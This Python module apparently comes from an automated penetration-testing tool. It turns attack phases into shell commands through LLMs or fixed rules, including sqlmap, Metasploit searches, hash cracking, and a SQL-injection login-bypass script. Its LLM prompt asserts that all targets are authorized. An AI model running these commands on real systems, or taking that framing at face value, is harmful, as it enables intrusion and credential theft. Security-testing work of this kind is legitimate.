"""
AI Command Generator — XploitAI

Responsibilities:
- Translate high-level ActionProposals into executable shell commands.
- Ensure commands are syntactically valid and safe.
- Integrate with LLM for dynamic command generation when enabled.

This module is the bridge between "What to do" (Decision) and "How to do it" (Execution).
"""

from __future__ import annotations

import json
import logging
import os
import re
import shlex
from urllib.parse import urlsplit
from dataclasses import dataclass
from typing import Any, Mapping, Optional

from services.command_template_utils import (
    CANONICAL_TEMPLATES,
    build_target_context,
    normalize_command_targets,
    render_command_template,
)

# Attempt to import the LLM adapter (Phase 3/Auto feature)
try:
    from ai.llm.gemini import GeminiAdapter
    GEMINI_AVAILABLE = True
except ImportError:
    GEMINI_AVAILABLE = False

try:
    from ai.llm.groq_adapter import GroqAdapter
    GROQ_AVAILABLE = True
except ImportError:
    GROQ_AVAILABLE = False

try:
    from ai.llm.nvidia_adapter import NvidiaAdapter
    NVIDIA_AVAILABLE = True
except ImportError:
    NVIDIA_AVAILABLE = False

LLM_AVAILABLE = GEMINI_AVAILABLE or GROQ_AVAILABLE or NVIDIA_AVAILABLE

logger = logging.getLogger(__name__)


@dataclass
class GeneratedCommand:
    shell_command: str
    explanation: str


class CommandGenerator:
    """
    Generates shell commands from abstract actions.
    Supports both rule-based generation (deterministic) and LLM-based generation (dynamic).
    """

    def __init__(self, use_llm: bool = True, llm_provider: str = "auto") -> None:
        """
        Initialize the command generator.

        Args:
            use_llm: Whether to attempt using the LLM for generation.
            llm_provider: 'auto', 'gemini', 'groq', or 'nvidia'.
        """
        self.use_llm = use_llm
        self.llm_client = None

        from core.config import get_config
        from ai.llm.task_router import TaskRouterAdapter

        if not self.use_llm:
            from ai.llm.local_rule_engine import LocalRuleEngine

            self.llm_client = LocalRuleEngine()
            logger.info("CommandGenerator initialized in rule-only mode.")
            return

        llm_provider = (llm_provider or "auto").lower()
        if llm_provider not in {"auto", "fallback", "hybrid", "gemini", "groq", "nvidia"}:
            logger.warning("CommandGenerator provider '%s' is disabled.", llm_provider)
            llm_provider = "auto"

        if llm_provider == "auto":
            llm_provider = get_config("DEFAULT_LLM_PROVIDER", "gemini")
            llm_provider = (llm_provider or "auto").lower()
            if llm_provider not in {"auto", "fallback", "hybrid", "gemini", "groq", "nvidia"}:
                llm_provider = "gemini"

        # Ensure GEMINI_API_KEY is aliased to GOOGLE_API_KEY if needed
        google_key = os.getenv("GOOGLE_API_KEY")
        gemini_key = os.getenv("GEMINI_API_KEY")
        if not google_key and gemini_key:
            os.environ["GOOGLE_API_KEY"] = gemini_key

        adapters = []
        adapters_by_name = {}

        def _register(name: str, adapter) -> None:
            if adapter is None:
                return
            adapters.append(adapter)
            adapters_by_name[name] = adapter

        try:
            if llm_provider in ("fallback", "auto"):
                if GEMINI_AVAILABLE:
                    a = GeminiAdapter()
                    if getattr(a, "_client", None):
                        _register("gemini", a)
                if GROQ_AVAILABLE:
                    a = GroqAdapter()
                    if getattr(a, "_client", None):
                        _register("groq", a)
                if NVIDIA_AVAILABLE:
                    a = NvidiaAdapter()
                    if getattr(a, "_available", False):
                        _register("nvidia", a)
            elif llm_provider == "hybrid":
                if NVIDIA_AVAILABLE:
                    a = NvidiaAdapter()
                    if getattr(a, "_available", False):
                        _register("nvidia", a)
                if GROQ_AVAILABLE:
                    a = GroqAdapter()
                    if getattr(a, "_client", None):
                        _register("groq", a)
                if GEMINI_AVAILABLE:
                    a = GeminiAdapter()
                    if getattr(a, "_client", None):
                        _register("gemini", a)
            elif llm_provider == "gemini" and GEMINI_AVAILABLE:
                a = GeminiAdapter()
                if getattr(a, "_client", None):
                    _register("gemini", a)
            elif llm_provider == "groq" and GROQ_AVAILABLE:
                a = GroqAdapter()
                if getattr(a, "_client", None):
                    _register("groq", a)
            elif llm_provider == "nvidia" and NVIDIA_AVAILABLE:
                a = NvidiaAdapter()
                if getattr(a, "_available", False):
                    _register("nvidia", a)
        except Exception as e:
            logger.warning("CommandGenerator: failed to init LLM adapter(s): %s", e)

        self.llm_client = TaskRouterAdapter(adapters_by_name) if len(adapters) > 1 else (adapters[0] if adapters else None)
        logger.info(
            "CommandGenerator initialized with %s (%d adapter(s)).",
            self.llm_client.__class__.__name__ if self.llm_client else "no AI adapter",
            len(adapters),
        )

    def generate(self, action_name: str, parameters: Mapping[str, Any]) -> GeneratedCommand:
        """
        Generate a shell command for the given action.

        Args:
            action_name: The name of the action (e.g., 'ServiceEnumeration').
            parameters: Dictionary of parameters for the action.

        Returns:
            GeneratedCommand: Object containing the shell command and an explanation.
        """
        logger.debug("Generating command for action: %s", action_name)

        # 1. Try LLM Generation if enabled
        if self.use_llm:
            try:
                result = self._generate_with_llm(action_name, parameters)
                if result:
                    return result
            except Exception as e:
                logger.error("LLM generation failed for '%s': %s.", action_name, e)
            return GeneratedCommand(
                shell_command="",
                explanation="AI did not generate a runnable command.",
            )

        # 2. Rule-based generation is only used when explicitly requested.
        return self._generate_rule_based(action_name, parameters)

    def _generate_rule_based(self, action_name: str, parameters: Mapping[str, Any]) -> GeneratedCommand:
        """Dispatch to specific rule-based generators."""
        if action_name == "PassiveRecon":
            return self._generate_passive_recon(parameters)
        elif action_name == "ServiceEnumeration":
            return self._generate_service_enumeration(parameters)
        elif action_name == "ExploitAttempt":
            return self._generate_exploit_attempt(parameters)
        elif action_name == "PrivilegeEscalation":
            return self._generate_privilege_escalation(parameters)
        elif action_name == "ProofOfCompromise":
            return self._generate_proof_of_compromise(parameters)
        elif action_name == "HTTPHeaderFetch":
            return self._generate_http_header_fetch(parameters)
        elif action_name == "TechnologyFingerprint":
            return self._generate_technology_fingerprint(parameters)
        elif action_name == "EndpointDiscovery":
            return self._generate_endpoint_discovery(parameters)
        elif action_name == "ParameterDiscovery":
            return self._generate_parameter_discovery(parameters)
        elif action_name == "VulnerabilityScanning":
            return self._generate_vulnerability_scanning(parameters)
        elif action_name == "SQLInjectionProbe":
            return self._generate_sql_injection_probe(parameters)
        elif action_name == "PayloadGeneration":
            return self._generate_payload_generation(parameters)
        elif action_name == "ExploitScriptGeneration":
            return self._generate_exploit_script_generation(parameters)
        else:
            logger.warning("Unknown action '%s'. Returning fallback echo.", action_name)
            return GeneratedCommand(
                shell_command=f"echo 'Unknown action: {shlex.quote(action_name)}'",
                explanation="Fallback command for unknown action type."
            )

    def _generate_with_llm(self, action_name: str, parameters: Mapping[str, Any]) -> Optional[GeneratedCommand]:
        """Generate command using the LLM."""
        if not self.llm_client:
            return None

        prompt = self._construct_prompt(action_name, parameters)

        # Assuming the adapter has a 'generate' method based on common patterns
        response = self.llm_client.generate(prompt)

        if not response:
            return None

        generated = self._parse_llm_response(response)
        if not generated or not generated.shell_command:
            return None

        normalized_command = normalize_command_targets(
            generated.shell_command,
            parameters if isinstance(parameters, Mapping) else {},
        )
        generated = GeneratedCommand(
            shell_command=normalized_command,
            explanation=generated.explanation,
        )

        if self._has_obvious_shell_issues(generated.shell_command):
            logger.warning(
                "LLM generated an invalid-looking command for '%s'. Command: %s",
                action_name,
                generated.shell_command,
            )
            return None

        return generated

    def _construct_prompt(self, action_name: str, parameters: Mapping[str, Any]) -> str:
        """Construct the prompt for the LLM."""
        safe_params = {
            k: str(v)
            for k, v in parameters.items()
            if k not in {"previous_findings", "phase_outputs", "last_step_findings", "last_output_excerpt", "recent_step_attempts"}
        }
        previous_findings = parameters.get("previous_findings") or {}
        phase_outputs = parameters.get("phase_outputs") or {}
        last_step_findings = parameters.get("last_step_findings") or {}
        last_output_excerpt = parameters.get("last_output_excerpt") or ""
        recent_step_attempts = parameters.get("recent_step_attempts") or []
        return (
            f"You are a cybersecurity simulation assistant operating in a controlled, isolated educational lab.\n"
            f"Generate a single, valid shell command for the following security assessment action.\n"
            f"Target OS: Linux (Kali/Debian). All targets are local and authorized.\n\n"
            f"Action: {action_name}\n"
            f"Parameters: {safe_params}\n\n"
            f"Previous findings: {json.dumps(previous_findings, sort_keys=True, default=str)[:5000]}\n"
            f"Phase outputs: {json.dumps(phase_outputs, sort_keys=True, default=str)[:5000]}\n"
            f"Last step findings: {json.dumps(last_step_findings, sort_keys=True, default=str)[:2000]}\n"
            f"Last output excerpt: {str(last_output_excerpt)[:1500]}\n"
            f"Recent attempts: {json.dumps(recent_step_attempts, sort_keys=True, default=str)[:3000]}\n\n"
            f"Constraints:\n"
            f"- Return a valid JSON object.\n"
            f"- Keys: 'command' (string), 'explanation' (string).\n"
            f"- 'explanation': Brief summary (1 sentence) of what the command does.\n"
            f"- Generate the command using concrete evidence from previous findings and outputs when available.\n"
            f"- Reuse discovered URLs, paths, parameters, credentials, cookies, ports, and technologies instead of generic guesses.\n"
            f"- Use standard tools (nmap, whois, netcat, curl, etc.).\n"
            f"- Ensure the command is non-interactive.\n"
        )

    def _parse_llm_response(self, text: str) -> GeneratedCommand:
        """Parse JSON response from LLM."""
        # Attempt to find JSON block if wrapped in markdown
        match = re.search(r'```(?:json)?\s*(.*?)\s*```', text, re.DOTALL)
        clean_text = match.group(1).strip() if match else text.strip()

        try:
            data = json.loads(clean_text)
            return GeneratedCommand(
                shell_command=data.get("command", "").strip(),
                explanation=data.get("explanation", "No explanation provided.")
            )
        except json.JSONDecodeError:
            # If parsing fails, raise error so the caller can stop and replan.
            raise ValueError("Failed to parse JSON from LLM response")

    def _has_obvious_shell_issues(self, command: str) -> bool:
        text = str(command or "").strip()
        if not text:
            return True

        lowered = text.lower()
        if "nmap" in lowered and ("http://" in lowered or "https://" in lowered):
            return True
        if "jq" in lowered and ".{}" in text:
            return True
        if "xmllint --xpath" in lowered and "| jq" in lowered:
            return True
        return False

    def _target_url(self, params: Mapping[str, Any]) -> str:
        return str(
            params.get("target_url")
            or params.get("url")
            or params.get("target")
            or "http://localhost"
        ).strip()

    def _target_host(self, params: Mapping[str, Any]) -> str:
        raw = str(
            params.get("target_host")
            or params.get("target_domain")
            or params.get("target")
            or self._target_url(params)
            or "localhost"
        ).strip()
        parsed = urlsplit(raw if "://" in raw else f"//{raw}")
        return parsed.hostname or raw

    def _target_domain(self, params: Mapping[str, Any]) -> str:
        return str(params.get("target_domain") or self._target_host(params) or "localhost").strip()

    def _target_port(self, params: Mapping[str, Any]) -> str:
        explicit = str(params.get("target_port") or "").strip()
        if explicit:
            return explicit
        parsed = urlsplit(self._target_url(params))
        if parsed.port:
            return str(parsed.port)
        return "80" if parsed.scheme == "http" else "443" if parsed.scheme == "https" else "80"

    def _is_ip_address(self, value: str) -> bool:
        return bool(re.fullmatch(r"(?:\d{1,3}\.){3}\d{1,3}", str(value or "").strip()))

    def _path_hint(self, params: Mapping[str, Any]) -> str:
        for key in ("path", "proof_path", "login_path", "endpoint"):
            value = str(params.get(key) or "").strip()
            if not value:
                continue
            if value.startswith("http://") or value.startswith("https://"):
                parsed = urlsplit(value)
                return parsed.path or "/"
            if value.startswith("/"):
                return value

        rationale = str(params.get("step_rationale") or params.get("rationale") or "").strip()
        if rationale:
            path_match = re.search(r"(/[A-Za-z0-9._/-]+)", rationale)
            if path_match:
                return path_match.group(1)
            dotfile_match = re.search(r"(\.[A-Za-z0-9._-]+)", rationale)
            if dotfile_match:
                return "/" + dotfile_match.group(1).lstrip("/")
        return ""

    def _candidate_url(self, params: Mapping[str, Any]) -> str:
        target_url = self._target_url(params).rstrip("/")
        for key in ("url", "endpoint"):
            value = str(params.get(key) or "").strip()
            if not value:
                continue
            if value.startswith("http://") or value.startswith("https://"):
                return value
            if value.startswith("/"):
                return f"{target_url}{value}"

        path_hint = self._path_hint(params)
        if path_hint:
            return f"{target_url}{path_hint}"
        return target_url

    def _search_term(self, params: Mapping[str, Any], fallback: str = "php webapp") -> str:
        for key in ("tech", "service", "product", "vulnerability_id", "target_host"):
            value = str(params.get(key) or "").strip()
            if value:
                return value
        return fallback

    def _generate_passive_recon(self, params: Mapping[str, Any]) -> GeneratedCommand:
        domain = self._target_domain(params)
        safe_domain = shlex.quote(str(domain))
        return GeneratedCommand(
            shell_command=(
                f"whois {safe_domain} && "
                f"dig {safe_domain} ANY +short && "
                f"theHarvester -d {safe_domain} -b bing -l 50"
            ),
            explanation=f"Uses whois, dig, and theHarvester to collect passive reconnaissance on {domain}."
        )

    def _generate_service_enumeration(self, params: Mapping[str, Any]) -> GeneratedCommand:
        host = self._target_host(params)
        safe_host = shlex.quote(str(host))
        return GeneratedCommand(
            shell_command=f"nmap -Pn -sV -sC -T4 {safe_host}",
            explanation=f"Uses Nmap to enumerate open ports, services, and common scripts on {host}."
        )

    def _generate_exploit_attempt(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = self._target_url(params)
        host = self._target_host(params)
        safe_url = shlex.quote(str(url).rstrip('/') + "/search?q=test")
        safe_term = shlex.quote(self._search_term(params))
        msf_host = str(host).replace('"', '').replace(";", "")
        sql_probe = (
            "import os,sys,urllib.request,urllib.error;"
            "url=os.environ.get('SQLMAP_URL','');"
            "\ntry:\n"
            " r=urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent':'XploitAI-Scanner/1.0'}),timeout=8);"
            " sys.exit(0 if r.status < 400 else 1)\n"
            "except urllib.error.HTTPError as e:\n"
            " sys.exit(1 if e.code == 404 else 0)\n"
            "except Exception:\n"
            " sys.exit(1)\n"
        )
        return GeneratedCommand(
            shell_command=(
                "set +e; "
                "echo 'EXPLOIT_RESEARCH_START'; "
                f"searchsploit {safe_term}; echo SEARCHSPLOIT_EXIT:$?; "
                f"SQLMAP_URL={safe_url}; export SQLMAP_URL; "
                f"if python3 -c {shlex.quote(sql_probe)}; then "
                f"sqlmap -u \"$SQLMAP_URL\" --batch --level 2 --risk 1; echo SQLMAP_EXIT:$?; "
                "else echo 'SQLMAP_SKIPPED: candidate URL returned 404 or was unreachable'; fi; "
                f"msfconsole -q -x \"search {msf_host}; exit -y\"; echo MSFCONSOLE_EXIT:$?; "
                "echo 'EXPLOIT_RESEARCH_COMPLETE'; "
                "exit 0"
            ),
            explanation=f"Uses Searchsploit, SQLmap, and a non-interactive Metasploit search to identify and validate exploit paths for {host}."
        )

    def _generate_privilege_escalation(self, params: Mapping[str, Any]) -> GeneratedCommand:
        hash_file = str(params.get("hash_file") or params.get("loot_path") or "").strip()
        if not hash_file:
            return GeneratedCommand(
                shell_command=(
                    "echo 'NO_CREDENTIAL_LOOT: skipping john/hashcat because no hash_file or loot_path was found'; "
                    "exit 2"
                ),
                explanation="Skips credential cracking because no captured hash or loot path is available."
            )
        safe_hash_file = shlex.quote(hash_file)
        hash_mode = shlex.quote(str(params.get("hash_mode") or "0"))
        return GeneratedCommand(
            shell_command=(
                f"if [ -s {safe_hash_file} ]; then "
                f"john --wordlist=/usr/share/wordlists/rockyou.txt {safe_hash_file} || "
                f"hashcat -m {hash_mode} -a 0 {safe_hash_file} /usr/share/wordlists/rockyou.txt; "
                f"else echo 'NO_HASH_FILE: {hash_file}'; exit 2; fi"
            ),
            explanation="Uses John the Ripper and Hashcat to validate post-exploitation credential material when hashes are available."
        )

    def _generate_proof_of_compromise(self, params: Mapping[str, Any]) -> GeneratedCommand:
        hash_file = str(params.get("hash_file") or params.get("loot_path") or "").strip()
        if not hash_file:
            proof_path = self._path_hint(params)
            if proof_path:
                proof_url = self._candidate_url({**dict(params), "endpoint": proof_path})
                proof_label = proof_path if proof_path.startswith("/") else urlsplit(proof_url).path or proof_path
                return GeneratedCommand(
                    shell_command=(
                        "python -c "
                        + shlex.quote(
                            "import urllib.request, urllib.error\n"
                            f"url={json.dumps(proof_url)}\n"
                            f"path={json.dumps(proof_label)}\n"
                            "try:\n"
                            "    req=urllib.request.Request(url, headers={'User-Agent':'XploitAI-Scanner/1.0'})\n"
                            "    resp=urllib.request.urlopen(req, timeout=8)\n"
                            "    body=resp.read(500).decode('utf-8','ignore').replace('\\n',' ')\n"
                            "    print('POC_CHECK ['+str(resp.status)+'] '+path)\n"
                            "    if resp.status < 400:\n"
                            "        print('PROOF_FOUND: '+path+' => '+body[:220])\n"
                            "    resp.close()\n"
                            "except urllib.error.HTTPError as e:\n"
                            "    print('POC_CHECK ['+str(e.code)+'] '+path)\n"
                            "except Exception as e:\n"
                            "    print('POC_ERROR: '+path+' => '+str(e))\n"
                        )
                    ),
                    explanation=f"Verifies exposed proof path {proof_label} and records proof evidence."
                )
            context = build_target_context(self._target_url(params))
            return GeneratedCommand(
                shell_command=render_command_template(CANONICAL_TEMPLATES["ProofOfCompromise"], context),
                explanation="Checks target proof paths because no captured credential hash file is available."
            )
        safe_hash_file = shlex.quote(hash_file)
        return GeneratedCommand(
            shell_command=(
                f"if [ -s {safe_hash_file} ]; then "
                f"john --show {safe_hash_file} || hashcat --show {safe_hash_file}; "
                f"else echo 'NO_HASH_FILE: {hash_file}'; exit 2; fi"
            ),
            explanation="Uses post-exploitation password tooling to display recovered proof artifacts from captured credential material."
        )

    def _generate_http_header_fetch(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = self._target_url(params)
        safe_url = shlex.quote(str(url))
        return GeneratedCommand(
            shell_command=f"curl -I {safe_url}",
            explanation=f"Fetches HTTP headers from {url}."
        )

    def _generate_technology_fingerprint(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = self._target_url(params)
        safe_url = shlex.quote(str(url))
        return GeneratedCommand(
            shell_command=f"whatweb {safe_url}",
            explanation=f"Identifies web technologies used by {url}."
        )

    def _generate_endpoint_discovery(self, params: Mapping[str, Any]) -> GeneratedCommand:
        host = self._target_host(params)
        port = self._target_port(params)
        safe_host = shlex.quote(str(host))
        safe_port = shlex.quote(str(port))
        safe_url = shlex.quote(str(self._target_url(params)).rstrip('/'))
        return GeneratedCommand(
            shell_command=(
                f"nmap -Pn -p {safe_port} --script http-enum,http-title {safe_host} ; "
                f"nc -vz {safe_host} {safe_port} ; "
                f"dirsearch -u {safe_url} "
                f"-w /usr/share/seclists/Discovery/Web-Content/common.txt "
                f"--exclude-status 404,400 || true"
            ),
            explanation=f"Uses Nmap, Netcat, and dirsearch to enumerate reachable services and web content on {host}:{port}."
        )

    def _generate_parameter_discovery(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = self._target_url(params)
        base_url = str(url).rstrip("/")
        endpoints = [
            base_url,
            base_url + "/login",
            base_url + "/search",
            base_url + "/api",
            base_url + "/api/v1",
        ]
        return GeneratedCommand(
            shell_command=(
                "python -c "
                + shlex.quote(
                    "import re, urllib.parse, urllib.request, urllib.error\n"
                    f"endpoints={json.dumps(endpoints)}\n"
                    "candidate_params=['id','user','username','password','q','search','query','page','debug','test','admin','Login','user_token']\n"
                    "seen=set()\n"
                    "for endpoint in endpoints:\n"
                    "    try:\n"
                    "        req=urllib.request.Request(endpoint, headers={'User-Agent':'XploitAI-Scanner/1.0'})\n"
                    "        resp=urllib.request.urlopen(req, timeout=8)\n"
                    "        body=resp.read(12000).decode('utf-8','ignore')\n"
                    "        qs=urllib.parse.parse_qs(urllib.parse.urlsplit(resp.geturl()).query)\n"
                    "        for name in qs.keys(): seen.add(name)\n"
                    "        for name in re.findall(r'''(?:name|id)=[\"']([^\"']{1,64})[\"']''', body, re.I): seen.add(name)\n"
                    "        resp.close()\n"
                    "    except Exception:\n"
                    "        pass\n"
                    "print('PARAMETER_PROBE_COMPLETE')\n"
                    "for name in sorted(seen): print('PARAM_FOUND: '+name)\n"
                    "for name in candidate_params:\n"
                    "    if name not in seen: print('PARAM_CANDIDATE: '+name)\n"
                )
            ),
            explanation=f"Uses a bounded Python HTTP/form probe to discover likely parameters for {url}."
        )

    def _generate_vulnerability_scanning(self, params: Mapping[str, Any]) -> GeneratedCommand:
        scan_url = self._candidate_url(params)
        safe_url = shlex.quote(str(scan_url))
        tech = str(params.get("tech") or "").lower()
        extra = f" ; wpscan --url {safe_url} --enumerate vp || true" if "wordpress" in tech else ""
        return GeneratedCommand(
            shell_command=f"nikto -h {safe_url} -ask no ; nuclei -u {safe_url} -silent || true{extra}",
            explanation=f"Uses Nikto and Nuclei, plus WPScan when WordPress is detected, to assess {scan_url}."
        )

    def _generate_sql_injection_probe(self, params: Mapping[str, Any]) -> GeneratedCommand:
        url = self._target_url(params)
        safe_url = shlex.quote(str(url).rstrip('/') + "/search?q=test")
        return GeneratedCommand(
            shell_command=f"sqlmap -u {safe_url} --batch --level 2 --risk 1",
            explanation=f"Probes a likely parameterized endpoint on {url} for SQL injection."
        )

    def _generate_payload_generation(self, params: Mapping[str, Any]) -> GeneratedCommand:
        payload = params.get("payload", "' OR '1'='1")
        safe_payload = shlex.quote(str(payload))
        return GeneratedCommand(
            shell_command=(
                "python -c \"import base64; "
                f"p={safe_payload}; "
                "print('PAYLOAD_GENERATED'); "
                "print('raw=' + p); "
                "print('b64=' + base64.b64encode(p.encode()).decode())\""
            ),
            explanation="Generates a safe, encoded demonstration payload for exploit simulation."
        )

    def _generate_exploit_script_generation(self, params: Mapping[str, Any]) -> GeneratedCommand:
        target = str(params.get("target_url") or params.get("target") or "http://localhost")
        target_json = json.dumps(target)
        return GeneratedCommand(
            shell_command=(
                "python -c \"import json; "
                f"target={target_json}; "
                "lines=['#!/usr/bin/env python3','import urllib.request','import urllib.parse','',"
                "'target = ' + repr(target.rstrip('/')),"
                "'post_data = urllib.parse.urlencode([(\\\"username\\\", \\\"\\\\\\' OR \\\\\\'1\\\\\\'=\\\\\\'1\\\"), (\\\"password\\\", \\\"test\\\")]).encode()',"
                "'req = urllib.request.Request(target + \\\"/login\\\", data=post_data)',"
                "'resp = urllib.request.urlopen(req, timeout=5)',"
                "'print(\\\"status=\\\", resp.status)',"
                "'print(resp.read(300).decode(\\\"utf-8\\\", \\\"ignore\\\"))']; "
                "print('SCRIPT_GENERATED'); print('\\\\n'.join(lines))\""
            ),
            explanation="Builds a PoC exploit script template for controlled lab validation."
        )
